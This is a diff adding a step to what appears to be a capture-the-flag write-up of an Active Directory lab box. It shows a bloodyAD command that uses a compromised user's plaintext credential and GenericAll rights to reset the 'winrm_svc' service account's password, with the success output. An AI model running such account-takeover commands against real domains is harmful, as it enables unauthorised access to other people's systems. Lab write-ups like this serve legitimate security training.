@@ -294,4 +294,14 @@ Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
 ```
 This now means i have GenericAll over everything connected to the OU including the `winrm_svc` account
 
+```python
+faketime -f +7h bloodyAD -k --host dc01.rebound.htb -d rebound.htb -u oorend -p '1GR8t@$$4u' set password 'winrm_svc' 'Password123!'
+
+[+] Password changed successfully!
+```
+The password is now changed ill double check this just to be safe
+
+```python
+
+```
 
